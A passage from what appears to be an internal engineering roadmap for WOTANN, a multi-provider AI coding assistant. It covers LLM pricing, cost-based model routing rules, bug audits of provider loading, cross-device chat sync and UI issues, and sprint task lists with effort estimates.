| **Together** | Various 70B | $0.10-0.60 | $0.10-0.60 | — | — | ~200 | Open model hosting |
| **Fireworks** | Various 70B | $0.10-0.50 | $0.10-0.50 | — | — | ~200 | Open model hosting |
| **Ollama** | Gemma 4 / local | $0.00 | $0.00 | — | — | 20-80 | Free, private, offline |

**Key insight**: Price spread is **1,000x** ($0.02/M Mistral Nemo → $75/M Opus output). Intelligent routing can save 82%+ without sacrificing quality on tasks that don't need frontier models.

### Intelligent Routing Design — CONSERVATIVE (never degrade unless certain)

**Principle**: Optimize cost of the SAME model first (caching, batching, dedup). Switch models ONLY when task classification is >95% confident AND the task is trivially simple.

#### Layer 1: Same-Model Cost Reduction (ZERO quality risk)

These optimizations work for ALL providers. No model switching. No quality tradeoff.

| Optimization | Providers | Savings | LOC | How |
|---|---|---|---|---|
| **Prompt caching — stable prefix ordering** | Anthropic, OpenAI, Gemini, DeepSeek, xAI, Groq | 50-90% on input | ~50 | Order system prompt sections stable-first (identity → tools → skills → memory → user message). Add `SESSION_BOUNDARY` marker between cached and volatile sections. |
| **Cache TTL extension to 1h** | Anthropic (beta header) | $8-11/mo | ~30 | `anthropic-beta: prompt-caching-2024-07-31` + structure system prompt for byte-stability |
| **Tool-call result dedup** | All | $2-3/mo | ~50 | Hash(toolName + args) → cache Read/Grep/Glob results within same session |
| **Structured output schema** | OpenAI, Gemini, DeepSeek | $2-4/mo | ~50 | `response_format: {type: "json_schema"}` eliminates retry tax (~20% of calls) |
| **Batch API** | OpenAI (50% off), Anthropic (50%), Gemini (50%) | $3-6/mo | ~100 | Route non-interactive tasks (research, analysis, batch edits) through batch endpoint |
| **Token-efficient tools header** | Anthropic | $1-2/mo | ~5 | `anthropic-beta: token-efficient-tools-2025-02-19` — shorter tool descriptions |
| **OpenAI predicted outputs** | OpenAI | $1-2/mo | ~30 | Pass original file as `prediction` parameter — 3-5x faster edits, cheaper |
| **Skill metadata-only injection** | All | $1-2/mo | ~20 | Inject YAML frontmatter only in system prompt; load full skill body on-demand |
| **WASM bypass expansion** | All (local computation) | $0.50-1/mo | ~100 | Handle count, pretty-print, diff, sha256, uuid, regex via WASM — skip LLM entirely |

**Layer 1 alone saves $19-31/mo (35-55% reduction) with ZERO quality risk.**

#### Layer 2: Provider-Optimal Routing (switch to BETTER provider for specific tasks)

This is NOT downgrading — it's routing to the provider that's BEST for a specific task type. The user's preferred frontier model stays as default.

| Task Type | Route To | Why | Savings vs Opus |
|---|---|---|---|
| **Web research / fact-checking** | Gemini 3.1 Pro | FREE Google Search grounding (1500/day). No other provider has this. | 100% (free grounding) |
| **Sandboxed code execution** | Gemini 2.5 Flash | FREE `code_execution` tool. Python runs in Google's sandbox at zero cost. | 100% (free execution) |
| **URL content extraction** | Gemini 3.1 Pro | FREE `url_context` (20 URLs, 34MB each). Replaces web-fetch tool calls entirely. | 95%+ |
| **Math / formal reasoning** | DeepSeek R1 | $0.55/M input vs $15/M Opus. Specifically designed for reasoning. BFCL competitive. | 96% cheaper |
| **Speed-critical iterations** | Groq Llama 70B | 394 tok/s vs 80 tok/s. Same answer quality for simple prompts, 5x wall-clock improvement. | 96% cheaper, 5x faster |
| **Multilingual content** | Mistral Large 3 | Best European language support. $0.50/M vs $3/M Sonnet. | 83% cheaper |

**These are UPGRADES, not downgrades.** The user gets BETTER results at lower cost because each provider has a specialty WOTANN can exploit.

#### Layer 3: Conservative Task-Based Downgrading (ONLY when safe)

**NEVER downgrade when:**
- User explicitly selected a model
- Task involves security-sensitive code
- Task involves financial/monetary operations
- Previous attempt with a weaker model failed on similar task
- Task requires multi-file coherence (3+ files)
- Task is in autonomous mode (consistency needed across cycles)
- Task involves complex debugging (ambiguous error message)
- Confidence of task classification is below 95%
- Cost difference is <$0.05 (not worth the risk)

**ONLY downgrade when ALL conditions met:**
1. User did NOT explicitly select a model (using "auto" or default)
2. Task classification confidence ≥ 95%
3. Task is ONE of these trivial types:
   - Pure formatting / linting (`fix indentation`, `sort imports`)
   - Simple Q&A about visible code (`what does this function do?`)
   - Commit message generation
   - Config file generation (`tsconfig.json`, `.eslintrc`)
   - Package.json field updates
   - Markdown/README generation
   - Single-line typo fixes
4. The cheaper model has a tracked success rate ≥ 90% on this task class

**Downgrade targets** (cheapest model that can reliably handle trivial tasks):
```
Local Gemma 4 (free) → Groq Llama 8B ($0.05/M) → DeepSeek V4 ($0.30/M) → Gemini Flash ($0.15/M)
```

**Track and learn**: If a downgraded task fails (user corrects, retries, or the result is wrong), blacklist that task class from downgrading for 48 hours and log to Engram.

#### Layer 4: Free Tier Maximization

For users on free tier (no API keys), route through ALL free options before asking for payment:

```
Ollama (Gemma 4 local, unlimited)
  → Groq free tier (30 RPM, Llama 70B)
    → Gemini free tier (250 RPD, Flash)
      → HuggingFace (rate-limited, various)
        → xAI $25 free credits (new users)
          → "Add an API key to continue"
```

**Provider-specific free capabilities** (no competitor exposes all of these):
- **Gemini grounding**: 500-1500 free Google Searches per day
- **Gemini code_execution**: FREE sandboxed Python (unlimited)
- **Gemini url_context**: FREE URL scraping (20 URLs/request)
- **Groq**: 14,400 free requests/day at 394 tok/s
- **xAI**: $25 free credits on signup + $150/mo data-sharing program

### PRICING_TABLE Fix Required (S2-25 expanded)

The current `cost-oracle.ts` PRICING_TABLE has only 5 entries (3 Anthropic + 2 OpenAI) with OpenAI prices 3-4x too high. Expand to cover all 17 providers with April 2026 verified rates:

```typescript
const PRICING_TABLE: readonly ModelPricing[] = [
  // Anthropic
  { provider: "anthropic", model: "claude-opus-4-6", inputPer1k: 0.015, outputPer1k: 0.075, thinkingPer1k: 0.015 },
  { provider: "anthropic", model: "claude-sonnet-4-6", inputPer1k: 0.003, outputPer1k: 0.015, thinkingPer1k: 0.003 },
  { provider: "anthropic", model: "claude-haiku-4-5", inputPer1k: 0.0008, outputPer1k: 0.004, thinkingPer1k: 0.0008 },
  // OpenAI
  { provider: "openai", model: "gpt-5.4", inputPer1k: 0.0025, outputPer1k: 0.010, thinkingPer1k: 0.0025 },
  { provider: "openai", model: "gpt-5", inputPer1k: 0.00125, outputPer1k: 0.010, thinkingPer1k: 0.00125 },
  { provider: "openai", model: "gpt-4.1", inputPer1k: 0.002, outputPer1k: 0.008, thinkingPer1k: 0.002 },
  // Google
  { provider: "gemini", model: "gemini-3.1-pro", inputPer1k: 0.002, outputPer1k: 0.012, thinkingPer1k: 0.002 },
  { provider: "gemini", model: "gemini-2.5-flash", inputPer1k: 0.00015, outputPer1k: 0.0006, thinkingPer1k: 0.00015 },
  // DeepSeek
  { provider: "deepseek", model: "deepseek-v4", inputPer1k: 0.0003, outputPer1k: 0.0005, thinkingPer1k: 0.0003 },
  { provider: "deepseek", model: "deepseek-r1", inputPer1k: 0.00055, outputPer1k: 0.00219, thinkingPer1k: 0.00055 },
  // xAI
  { provider: "xai", model: "grok-4", inputPer1k: 0.003, outputPer1k: 0.015, thinkingPer1k: 0.003 },
  { provider: "xai", model: "grok-4.1-fast", inputPer1k: 0.0002, outputPer1k: 0.0005, thinkingPer1k: 0.0002 },
  // Mistral
  { provider: "mistral", model: "mistral-large-3", inputPer1k: 0.0005, outputPer1k: 0.0015, thinkingPer1k: 0.0005 },
  { provider: "mistral", model: "mistral-nemo", inputPer1k: 0.00002, outputPer1k: 0.00004, thinkingPer1k: 0.00002 },
  { provider: "mistral", model: "codestral", inputPer1k: 0.0003, outputPer1k: 0.0009, thinkingPer1k: 0.0003 },
  // Groq (open models, fast inference)
  { provider: "free", model: "llama-3.3-70b-versatile", inputPer1k: 0.00059, outputPer1k: 0.00079, thinkingPer1k: 0 },
  // Together/Fireworks (open model hosting)
  { provider: "together", model: "meta-llama/Llama-3.3-70B-Instruct-Turbo", inputPer1k: 0.0006, outputPer1k: 0.0006, thinkingPer1k: 0 },
  { provider: "fireworks", model: "llama-v3p3-70b-instruct", inputPer1k: 0.0005, outputPer1k: 0.0005, thinkingPer1k: 0 },
  // Local
  { provider: "ollama", model: "gemma4", inputPer1k: 0, outputPer1k: 0, thinkingPer1k: 0 },
];
```

### MODEL_PREFERENCES Fix Required (task-semantic-router.ts)

The current MODEL_PREFERENCES uses generic names ("claude-opus-4", "gpt-4") that don't match ProviderName enum values. Replace with provider-aware routing:

```typescript
// Map task type → ordered list of (provider, model) pairs
// IMPORTANT: This is "best model for this task" not "cheapest model"
const MODEL_PREFERENCES: ReadonlyMap<TaskType, readonly ProviderModel[]> = new Map([
  ["code-generation",    [{p:"anthropic",m:"claude-sonnet-4-6"}, {p:"openai",m:"gpt-5"}, {p:"deepseek",m:"deepseek-v4"}, {p:"ollama",m:"gemma4"}]],
  ["code-review",        [{p:"anthropic",m:"claude-sonnet-4-6"}, {p:"openai",m:"gpt-5"}, {p:"mistral",m:"codestral"}]],
  ["debugging",          [{p:"anthropic",m:"claude-sonnet-4-6"}, {p:"openai",m:"gpt-5"}, {p:"deepseek",m:"deepseek-v4"}]],
  ["research",           [{p:"gemini",m:"gemini-3.1-pro"}, {p:"perplexity",m:"sonar"}, {p:"openai",m:"gpt-5"}]],  // Gemini first = free grounding
  ["creative-writing",   [{p:"anthropic",m:"claude-sonnet-4-6"}, {p:"openai",m:"gpt-5"}, {p:"mistral",m:"mistral-large-3"}]],
  ["data-analysis",      [{p:"openai",m:"gpt-5"}, {p:"gemini",m:"gemini-3.1-pro"}, {p:"deepseek",m:"deepseek-v4"}]],
  ["conversation",       [{p:"deepseek",m:"deepseek-v4"}, {p:"gemini",m:"gemini-2.5-flash"}, {p:"ollama",m:"gemma4"}]],  // Cheapest for chat
  ["math-reasoning",     [{p:"deepseek",m:"deepseek-r1"}, {p:"anthropic",m:"claude-opus-4-6"}, {p:"openai",m:"gpt-5"}]],  // DeepSeek R1 first = cheapest reasoning
  ["document-processing",[{p:"gemini",m:"gemini-3.1-pro"}, {p:"openai",m:"gpt-5"}, {p:"ollama",m:"gemma4"}]],  // Gemini = free URL context
  ["image-understanding",[{p:"anthropic",m:"claude-sonnet-4-6"}, {p:"openai",m:"gpt-5"}, {p:"gemini",m:"gemini-3.1-pro"}]],
]);
```

### Stale Default Models in Registry (new items for Sprint 2)

| Provider | Current Default | Should Be | Why |
|---|---|---|---|
| gemini | `gemini-2.5-flash` | `gemini-3.1-flash-lite` or `gemini-2.5-flash` | 3.1 Flash-Lite is newer; 2.5 Flash is still valid |
| xai | `grok-3` | `grok-4.1-fast` | Newer, cheaper ($0.20 vs older pricing), 2M context |
| deepseek | `deepseek-chat` | `deepseek-v4` | V4 launched March 2026, best value |
| openai (in registry) | via `createOpenAIAdapter` | Verify default model string | May be stale |

### Anthropic Subscription Adapter — MISSING from S1-3

`src/providers/anthropic-subscription.ts` is a SEPARATE adapter used when `auth.method === "oauth-token"` (users who log in via Claude subscription, not API key). It also has NO tools in the fetch body. **Add S1-3b**: same tool fix needed for this adapter.

### Provider Coverage in Execution Plan — GAP ANALYSIS

| Provider | Adapter | Tool Fix | Pricing | Router | Status |
|---|---|---|---|---|---|
| anthropic | dedicated | S1-3 | ✅ in oracle | Needs update | **COVERED** |
| anthropic (subscription) | dedicated | **MISSING — add S1-3b** | ✅ | Needs update | **GAP** |
| openai | openai-compat | S1-4 | ❌ prices 3-4x too high | Needs update | **PARTIAL** |
| codex | dedicated | S1-6 | ❌ not in oracle | Not in router | **PARTIAL** |
| copilot | dedicated | S1-5 | ❌ not in oracle | Not in router | **PARTIAL** |
| ollama | dedicated | ✅ works | ✅ $0 | ✅ "local" | **COVERED** |
| gemini | openai-compat | S1-4 | ❌ not in oracle | Needs update | **PARTIAL** |
| huggingface | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| free (Groq) | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| azure | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| bedrock | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| vertex | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| mistral | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| deepseek | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| perplexity | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| xai | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| together | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| fireworks | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |
| sambanova | openai-compat | S1-4 | ❌ not in oracle | Not in router | **PARTIAL** |

**13 of 17 providers** have no pricing in the cost oracle and no entry in the model preference router. This means cost predictions are wrong and task routing ignores most providers.

### New Sprint Items from §74

Add these to Sprint 2:

| ID | Task | Effort | Verify |
|---|---|---|---|
| S2-31 | **Fix Anthropic subscription adapter tools** — same as S1-3 but for `anthropic-subscription.ts` | 30 min | `npm run typecheck` |
| S2-32 | **Expand PRICING_TABLE to all 17 providers** — replace 5-entry table with full 20+ entry table using April 2026 verified rates (see §74 pricing table) | 1h | `npm test -- cost` |
| S2-33 | **Rewrite MODEL_PREFERENCES to be provider-aware** — use `{provider, model}` pairs instead of generic model names. Add entries for all task types × all available providers. Implement Layer 2 provider-optimal routing (Gemini for research, DeepSeek R1 for reasoning, Groq for speed). | 2h | `npm test -- task-semantic-router` |
| S2-34 | **Implement conservative downgrade rules** — add confidence threshold (≥95%), never-downgrade conditions (explicit model, security, autonomous, multi-file), success-rate tracking per model×task class, 48h blacklist on failure | 2h | `npm test -- task-semantic-router` |
| S2-35 | **Update stale default models in registry** — xai `grok-3` → `grok-4.1-fast`, deepseek `deepseek-chat` → `deepseek-v4` | 15 min | `npm run typecheck` |
| S2-36 | **Implement Layer 1 cost optimizations** — prompt ordering linter (stable prefix), tool-call result dedup, skill metadata-only injection | 3h | `npm test` |

### Updated Sprint 2 Impact

Sprint 2 grows from 30 to 36 items. Combined with the pacing note in §72.2 (30 items already = 2 weeks), this is now **3 weeks** of Sprint 2 work. Recommend splitting:

- **Sprint 2a** (Week 2): S2-1 through S2-17 (original items, 25h)
- **Sprint 2b** (Week 3): S2-18 through S2-30 (§72.1 additions, 15h)
- **Sprint 2c** (Week 4): S2-31 through S2-36 (§74 provider items, 9h)

Adjusted total timeline: **6 weeks** to v0.2.0.

---

---

## §75. ROUND 9 — Runtime/UX Bugs, Model-Specificity, Cross-Device Sync (21 total agents)

> 5 Opus-class agents targeting user-facing bugs invisible to static analysis. Traced complete UX flows: model picker → adapter → query, iOS ↔ desktop sync, Computer Use model awareness, every hardcoded provider assumption, streaming/navigation/theming bugs.

### 75.1 MODEL PICKER — WHY DETECTED PROVIDERS DON'T LOAD

**Root cause**: Three independent layers make independent decisions about provider availability:

| Layer | What it checks | Result |
|---|---|---|
| ProviderService (Settings UI) | Credential FILE/ENV exists | "Configured" — even if key is invalid/expired |
| discoverProviders (runtime startup) | Env vars at startup time | Builds adapters — missed if key added after startup |
| handleQuery (actual query) | Runtime has initialized adapters | Query works — or doesn't |

**7 specific disconnects found:**
1. Provider shows "Configured" because env var exists — but key is invalid/expired
2. Provider added via Settings UI after daemon started — adapter not in AgentBridge (requires restart)
3. `providers.list` returns fallback model lists (hardcoded Claude/GPT names) even when API unreachable — ModelPicker shows models that can't be used
4. `handleQuery` falls back to hardcoded `"gemma4"` when selected model string is empty — user picks GPT-5 but query goes to local Gemma
5. Status polling (`refreshStatus` every 5s) overwrites model selection → localStorage overwrites back → race condition with `switch_provider` which silently swallows errors
6. `send_message` (non-streaming) is a no-op that returns just a message ID — `engine.ts:sendMessage()` calls this dead path
7. When daemon is down, Rust `hardcoded_providers()` only probes Ollama — cloud providers invisible

### 75.2 COMPUTER USE — NOT MODEL-AWARE, NO CHAT

**PerceptionAdapter exists but has ZERO importers.** It has well-designed 3-tier logic:
- `frontier-vision`: raw screenshot buffer for Opus/GPT-5/Gemini Pro
- `small-vision`: annotated screenshots with Set-of-Mark overlays
- `text-only`: structured OCR text for non-vision models

But `ComputerUseAgent` and `PerceptionEngine` always run the OCR-only path regardless of model. No code routes CU to a vision-capable provider when the user's model lacks vision.

**Desktop CU has NO chat pane** — standalone control panel only (ScreenPreview + MouseControl + KeyboardControl + AppApprovals).

**iOS Remote Desktop is FULLY FUNCTIONAL** — view screen (polled capture), full control (click, double-click, right-click, drag, scroll, keyboard, shortcuts), zoom (1-5x), minimap, haptics, adaptive refresh.

### 75.3 iOS CHAT SYNC — THREE DISCONNECTED STORES

**THREE separate conversation stores with NO shared persistence:**
1. Daemon runtime session (in-memory, single session)
2. Desktop Zustand store (in-memory, lost on refresh)
3. iOS AppState + UserDefaults cache (local to device)

**7 critical sync issues:**
1. iOS sees only 1 conversation — `conversations.list` aliases to `session.list` (returns current runtime session only)
2. No RPC method exists to fetch message history — iOS gets metadata but zero message content
3. Desktop never sees iOS-originated messages — companion routes to runtime but doesn't notify desktop UI
4. ConversationManager has zero file I/O despite doc claiming disk persistence
5. Supabase relay connected but never routes messages — `kairos.ts` calls `connect()` then NOTHING
6. Conversation IDs incompatible — iOS UUID vs desktop `conv_` prefix vs daemon session UUID
7. Desktop conversations lost on refresh — Zustand state is ephemeral

### 75.4 HARDCODED "ANTHROPIC" DEFAULTS — 8 CRITICAL LOCATIONS

| File:line | What's hardcoded | Impact |
|---|---|---|
| `runtime.ts:557` | `new ContextWindowIntelligence("anthropic")` | Context budgets wrong for all other providers |
| `runtime.ts:581` | `createSession("anthropic", "auto")` | Every session starts as Anthropic |
| `runtime.ts:628` | `new SessionRecorder("anthropic", "auto")` | Telemetry records wrong provider |
| `runtime.ts:1091,1180,1229,1255` | Error/WASM/hook paths yield `provider: "anthropic"` | UI shows wrong attribution |
| `app-state.ts:110-111` | `activeProvider: "anthropic"`, `activeModel: "claude-sonnet-4"` | Desktop defaults to Claude |
| `conversation-manager.ts:117-118` | New conversations default `provider: "anthropic"` | Conversations misattributed |
| `oracle-worker.ts:53-54` | `workerModel: "claude-haiku-4-5"`, `oracleModel: "claude-opus-4-6"` | **Autopilot is Claude-only** |
| `agent-bridge.ts:53` | `defaultProvider: "anthropic"` | Bridge fallback assumes Anthropic |

### 75.5 UX/RUNTIME BUGS — 24 ISSUES FOUND

**Streaming:**
- No "Stop Generating" button in ChatView (PromptInput has it, but ChatView uses ComposerInput which doesn't)
- iOS cancel streaming doesn't send RPC to desktop — daemon keeps generating
- Provider switch mid-stream has no guard — UI shows new provider, stream continues from old
- No retry mechanism after stream error

**Navigation:**
- 14 views in AppShell switch have `resolveLegacyView()` aliases — clicking "Agents" shows Workshop, "Canvas" shows Editor, "Projects" shows Chat
- `AppView` type only lists 12 values but AppShell has 26 case branches

**State:**
- All conversation/message state memory-only — lost on refresh
- Fork conversation always fails (passes empty string as `atMessageId`)
- Settings save uses global timer with race condition
- 23 functions in engine.ts have `catch { return [] }` — errors swallowed silently

**iOS:**
- 243 hardcoded font sizes (38% of font usage) bypass Dynamic Type
- Memory/Workflows/Agents views show "empty" instead of "disconnected" when offline
- 3 empty catch blocks in GitPanel and Diagnostics

**Theming:**
- 30+ hardcoded hex colors in desktop components
- No light mode CSS despite settings allowing `theme: "light"`
- iOS Obsidian Precision typography uses fixed sizes, not Dynamic Type

**Accessibility:**
- No visible focus indicators on header buttons
- Sidebar conversation context menu is mouse-only (no keyboard)
- `aria-live="polite"` on message list announces every streaming token

---

### 75.6 NEW SPRINT ITEMS FROM ROUND 9

#### Add to Sprint 1 (CRITICAL — provider loading):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S1-16 | **Replace all hardcoded "anthropic" defaults in runtime.ts** — lines 557, 581, 628, 1091, 1180, 1229, 1255. Use resolved provider from config/discovery. | 2h | `grep -n '"anthropic"' src/core/runtime.ts` returns 0 functional hardcodes |
| S1-17 | **Fix oracle-worker.ts hardcoded Claude models** — use session's active provider/model instead of hardcoded `claude-haiku-4-5` and `claude-opus-4-6` | 1h | `npm run typecheck` |
| S1-18 | **Fix app-state.ts and conversation-manager.ts defaults** — default to discovered/configured provider, not "anthropic" | 30 min | `grep '"anthropic"' src/desktop/app-state.ts` returns 0 |

#### Add to Sprint 2 (wiring + UX):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S2-37 | **Add Stop Generating button to ChatView** — wire `useStreaming.stopStreaming()` to ComposerInput or add inline stop button during streaming | 1h | Manual: start stream, click stop, stream ends |
| S2-38 | **Fix iOS cancel to send RPC** — `ChatViewModel.cancelStreaming()` must call `rpcClient.send("autonomous.cancel")` or equivalent | 30 min | Manual: cancel on iOS, desktop stops generating |
| S2-39 | **Guard provider switch during streaming** — disable `setProvider()` while `isStreaming` is true, or warn user | 30 min | Manual: can't switch provider during active stream |
| S2-40 | **Fix resolveLegacyView aliases** — add all 14 missing views to `AppView` type, remove aliases that redirect Agents→Workshop, Canvas→Editor, etc. | 1h | Manual: click "Agents" in palette, see AgentFleetDashboard (not Workshop) |
| S2-41 | **Fix fork conversation** — `forkConversation` passes empty string; fix to pass actual `atMessageId` | 30 min | Manual: right-click message, Fork creates new conversation |
| S2-42 | **Wire PerceptionAdapter into Computer Use** — import in `ComputerUseAgent`, use tier detection to send raw images to vision models and OCR text to non-vision models | 3h | CU with Opus sends screenshot, CU with Gemma sends text |
| S2-43 | **Add chat pane to ComputerUsePanel** — embed ChatView or message input alongside the control surface so users can instruct the agent while seeing the screen | 2h | Manual: type instruction in CU panel, see response |
| S2-44 | **Fix provider validation** — `detectCredential()` should verify key validity (lightweight API call), not just file existence. Show "Configured (unverified)" vs "Active (verified)" in Settings. | 2h | Settings shows green for verified, yellow for unverified |
| S2-45 | **Fix conversations.list to return all conversations** — not just current session. Add `messages.list` RPC for message history. | 3h | iOS sees multiple conversations with message history |
| S2-46 | **Add conversation persistence** — `conversation-manager.ts` must actually write to `~/.wotann/desktop/conversations/{id}.json`. Wire to Zustand store persist. | 3h | Restart desktop app, conversations still visible |
| S2-47 | **Wire Supabase relay message routing** — `kairos.ts` must call `relay.onMessage()` for incoming and `relay.publish()` for outgoing messages | 2h | iOS connected via Supabase sees messages from desktop |
| S2-48 | **Fix handleQuery model fallback** — when user selects a model, pass it through instead of falling back to "gemma4" | 1h | Select GPT-5 in picker, query goes to GPT-5 |
| S2-49 | **Add error feedback to engine.ts functions** — replace 23 `catch { return [] }` with `catch(e) { notify(e); return [] }` | 1h | Failed operations show error toast |

#### Add to Sprint 4 (polish):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S4-11 | **Replace 30+ hardcoded hex colors** with CSS variables (`var(--color-primary)`, etc.) | 2h | `grep -r "#[0-9A-Fa-f]\{6\}" desktop-app/src/components/ \| wc -l` decreases significantly |
| S4-12 | **Add light mode CSS** — `@media (prefers-color-scheme: light)` overrides in globals.css, or `.theme-light` class | 3h | Settings → Light mode → UI changes |
| S4-13 | **iOS Dynamic Type** — replace 243 hardcoded `.font(.system(size:))` with scaled equivalents using WTheme.Typography or `.font(.body)` etc. | 4h | iOS Settings → Larger Text → WOTANN fonts scale |
| S4-14 | **iOS offline state handling** — all views that call RPCs must check `connectionManager.isConnected` first and show "Not connected to desktop" instead of empty state | 2h | Disconnect from desktop, all views show connection status |
| S4-15 | **Fix conversation ID format** — standardize on UUID across all platforms. Desktop generates UUID, iOS generates UUID, daemon uses UUID. | 1h | Same conversation shows same ID on both platforms |

#### Add to Sprint 5/backlog:

| ID | Task | Effort | Why Deferred |
|---|---|---|---|
| S5-15 | Add keyboard focus indicators on header buttons | 30 min | Accessibility polish |
| S5-16 | Add keyboard handling to sidebar context menu | 30 min | Accessibility polish |
| S5-17 | Fix `aria-live` to not announce every streaming token | 1h | Screen reader optimization |
| S5-18 | Add ViewSkeleton spinner/animation instead of "Loading..." text | 30 min | Visual polish |
| S5-19 | Fix settings save race condition (replace global timer with proper debounce) | 30 min | Edge case |
| S5-20 | iOS empty catch blocks in GitPanel and Diagnostics | 15 min | Error visibility |

---

### 75.7 UPDATED GRAND TOTALS (Final)

| Sprint | Previous Total | New Items | Final Total | Hours |
|---|---|---|---|---|
| Sprint 0 | 11 | 0 | **11** | ~1.5h |
| Sprint 1 | 15 | 3 (S1-16,17,18) | **18** | ~28.5h |
| Sprint 2 | 36 | 13 (S2-37 through S2-49) | **49** | ~60h |
| Sprint 3 | 7 | 0 | **7** | ~37h |
| Sprint 4 | 10 | 5 (S4-11 through S4-15) | **15** | ~37h |
| Sprint 5 (backlog) | 14 | 6 (S5-15 through S5-20) | **20** | ~21h |
| **TOTAL** | **93** | **27** | **120 + 20 backlog** | **~185h + 21h** |

Sprint 2 is now 49 items / 60h — recommend splitting into **4 sub-sprints** (2a/2b/2c/2d, ~15h each).

Adjusted timeline: **~7 weeks** to v0.2.0 (was 6 weeks before Round 9).

---

---

## §76. ROUND 10 — Production Readiness, Competitive Intel, UX Journeys, Novel Features, Fleet System

> 7 final Opus agents (28 total). Covers: production readiness blockers, competitive landscape update (Claude Cowork already GA), full UX journey audit (5 personas), Agent-to-Agent coordination design, 25 novel features nobody has built, missing UI integrations, automagical setup gaps.

### 76.1 CRITICAL TIMELINE UPDATE

**Claude Cowork (formerly Claude Apps) is ALREADY GA** — shipped in Claude Desktop on macOS and Windows. The "60-90 day window" from §9 is CLOSED. WOTANN cannot race Anthropic on app-builder features. Instead, differentiate on what Anthropic structurally CANNOT match:

1. **Multi-provider** (Claude Cowork = Anthropic-only forever)
2. **Local-first / free-tier** (bundled Gemma 4, zero data leaving machine)
3. **iOS-native with Watch/CarPlay/Widgets/Siri** (Anthropic has no native iOS agent)
4. **Multi-channel presence** (14 real adapters vs Anthropic's chat-only)
5. **Persistent cross-session memory** (#1 developer-requested gap per surveys)
6. **API-key-first architecture** — Anthropic blocked OpenClaw from using subscriptions (April 4, 2026). Build around API keys, not subscription auth.

### 76.2 PRODUCTION READINESS — Add to Sprint 4

| ID | Task | Effort | Why |
|---|---|---|---|
| S4-16 | **Tauri auto-updater** — add `tauri-plugin-updater` to Cargo.toml, configure update endpoint | 3h | Users can't get patches without this |
| S4-17 | **Sentry crash reporting** — add `@sentry/node` + `@sentry/tauri`, configure with DSN | 2h | Can't diagnose crashes remotely |
| S4-18 | **macOS Keychain for API keys** — replace plaintext `~/.wotann/` storage with `security` CLI or `keytar` | 3h | API keys in plaintext = security risk for distribution |
| S4-19 | **SQLite integrity check on startup** — `PRAGMA integrity_check` + WAL checkpoint | 1h | Detect corruption before data loss |
| S4-20 | **`wotann export/backup` command** — snapshot `~/.wotann/` to a timestamped archive | 1h | Users need data safety before trusting autonomous mode |
| S4-21 | **Schema migration verification** — test that config migrations from 0.1.0→0.5.0 actually work | 1h | Already implemented but never tested end-to-end |

### 76.3 MISSING UI INTEGRATIONS — Add to Sprint 2

| ID | Task | Effort | Why |
|---|---|---|---|
| S2-50 | **Computer Use AI instruction pane on iOS** — add chat/prompt input to RemoteDesktopView so users can type "click the red button" while viewing the screen | 2h | Currently a dumb remote desktop with no AI |
| S2-51 | **iOS feature discoverability** — add "Explore" section to HomeView with feature cards for Memory, Skills, Workflows, Channels, Arena, Autopilot, Cost | 2h | Features buried in Settings → Tools, <5% discovery rate |
| S2-52 | **Memory CRUD** — add create/edit/delete buttons to MemoryInspector (desktop) and MemoryBrowser (iOS) | 2h | Currently read-only on both platforms |
| S2-53 | **iOS workflow run button** — add "Run" action to WorkflowsView list items | 30 min | iOS can list workflows but can't trigger them |
| S2-54 | **iOS standalone mode** — add "Use Without Mac" path in OnboardingView that downloads on-device model and starts local-only session | 3h | Currently pairing is mandatory; blocks iOS-first users |

### 76.4 AUTOMAGICAL SETUP — Add to Sprint 0/1

| ID | Task | Effort | Why |
|---|---|---|---|
| S0-12 | **Auto-pull Gemma 4 if Ollama has no models** — check `ollama list`, if empty, auto-pull appropriate variant by RAM | 30 min | Users with Ollama but no models get a broken experience |
| S1-19 | **Free tier guided setup** — add "Get free API key" links for Groq (groq.com/playground) and Gemini (aistudio.google.com) in onboarding Providers step | 1h | Free tier is WOTANN's differentiator but setup requires manual key hunting |
| S1-20 | **Proactive first insight on project open** — after project scan, surface one actionable finding: failing tests, missing types, security issue, deprecated API | 2h | The "wow moment" that makes first-time users stay |

### 76.5 NOVEL FEATURES — v0.3.0+ ROADMAP (25 features nobody has built)

**Cross-Device Intelligence (requires Watch + iOS + Mac):**
1. **Commute Briefing** — CarPlay reads overnight CI failures, PR reviews, agent completions; triage by voice
2. **Haptic Heartbeat** — Watch complication with green/yellow/red health + distinct haptic taps for status
3. **Biometric Flow Guard** — Watch HRV detects flow state; suppresses notifications, suggests breaks on fatigue
4. **Session Handoff** — tap "Relay" on iPhone, full agent state transfers from Mac for mobile monitoring
5. **Live Widget Dashboard** — iOS Home Screen + Lock Screen widgets showing agent progress, cost, build health
6. **Siri Shortcuts for Agent Tasks** — "Hey Siri, run my tests" from Watch, CarPlay, HomePod

**Multi-Provider as Safety (requires 17 providers):**
7. **Provider Tribunal** — high-stakes changes sent to 3 providers simultaneously, proceed only if 2/3 agree
8. **Phantom Pair Programmer** — 3 synthetic reviewers with different perspectives (security/performance/readability) from different providers
9. **Provider Reputation Ledger** — per-model, per-task dynamic accuracy scores from YOUR verification results

**Memory as Superpower (requires 8-layer memory):**
10. **Dream Replay** — overnight extraction of causal decision chains, not just fact compression
11. **Memory Confidence Decay** — facts decay over time, get boosted by codebase re-confirmation, auto-correct on contradiction
12. **Automatic Skill Distillation** — after 3+ similar solutions, auto-generates reusable skill from the pattern
13. **Code Archaeologist** — "why does this exist?" traces through git + channels + issue trackers + memory

**Channel Presence (requires 14 channel adapters):**
14. **Merge Prophet** — predicts merge conflicts by watching teammates' active branches via channel presence
15. **Expertise Radar** — knowledge graph of who-knows-what, auto-routes questions to the right person
16. **Channel Presence Routing** — routes notifications to whichever channel each person is active on
